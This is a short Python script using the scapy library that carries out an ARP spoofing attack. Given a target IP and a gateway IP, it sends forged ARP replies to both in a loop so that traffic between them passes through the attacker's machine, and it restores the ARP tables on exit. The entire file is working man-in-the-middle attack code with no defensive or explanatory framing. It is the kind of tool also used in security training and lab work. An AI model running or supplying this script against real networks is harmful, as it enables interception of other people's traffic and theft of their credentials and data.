#!/usr/bin/env python3
import scapy.all as scapy
import argparse
import time


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Enter the Target IP Address to perform ARP spoof")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Enter the Gateway IP Address to perform ARP spoof")
    options = parser.parse_args()
    return options


def get_mac(ip):
    arp_req = scapy.ARP(op=1, pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    mac_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    return mac_list[0][1].hwsrc


def spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    arp_req = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(arp_req, count=1, verbose=False)


def return_spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    arp_req = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_req, verbose=False, count=4)

packet_sent = 0
opt = get_args()
target = opt.target
gateway = opt.gateway

try:
    while True:
        spoof(target, gateway)
        spoof(gateway, target)
        packet_sent += 2
        print(f" \r [+] packet sent {str(packet_sent)}", end=""),
        time.sleep(2)

except KeyboardInterrupt:
    print(f"\n [-] Quitting the ARP Spoof Program...")
    return_spoof(gateway, target)
    return_spoof(target, gateway)


